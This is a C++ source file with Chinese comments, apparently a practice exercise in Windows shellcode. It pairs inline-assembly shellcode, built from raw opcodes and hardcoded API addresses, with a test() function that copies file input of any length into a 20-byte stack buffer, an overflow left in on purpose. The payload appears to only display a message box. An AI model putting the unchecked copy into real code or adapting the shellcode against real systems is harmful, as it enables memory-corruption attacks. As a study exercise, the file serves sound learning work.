// ShellCode01.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

#define defPath "C:\\Users\\CY-Pro13\\source\\repos\\2101_ShellCode\\ShellCode01\\shell.txt"

void shell()
{
	__asm
	{
		sub esp, 0x66;
		__asm _emit(0xE8)__asm _emit(0xFF)__asm _emit(0xFF)__asm _emit(0xFF);
		__asm _emit(0xFF)__asm _emit(0xC3)__asm _emit(0x5E);
		add esi, 0x7 + 0x8 + 0x7;	//指令+地址+文本
		call esi;
		//Address
		__asm _emit(0xA0)__asm _emit(0xEE)__asm _emit(0x87)__asm _emit(0x76);
		__asm _emit(0x00)__asm _emit(0x41)__asm _emit(0xC7)__asm _emit(0x76);
		//CO0kie 7
		__asm _emit(0x43)__asm _emit(0x4F)__asm _emit(0x30)__asm _emit(0x6B)
		__asm _emit(0x69)__asm _emit(0x65)__asm _emit(0x00);
	tag_ShellCode:
		xor eax, eax;
		sub esi, 0x7;
		push eax;
		push esi;
		push esi;
		push eax;
		sub esi, 0x8;
		call [esi];
		add esi, 0x4;
		push eax;
		call [esi];
	}
}

void test(char* buf, DWORD len)
{
	char buff[20];
	memcpy(buff, buf, len);
}

int main()
{
	char buff[255];

	//读取文件信息
	HANDLE handle = CreateFileA(defPath, GENERIC_READ,		//打开文件句柄
		0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (handle == INVALID_HANDLE_VALUE)
		return 0;
	DWORD dwRead = GetFileSize(handle, 0);
	printf("打开文件%p\t%lu\n", handle, dwRead);
	if (::ReadFile(handle, buff, dwRead, &dwRead, NULL))
	{
		CloseHandle(handle);
		test(buff, dwRead);
		return 0;
	}
	__asm ret;
	MessageBoxA(0, 0, 0, 0);
	shell();
}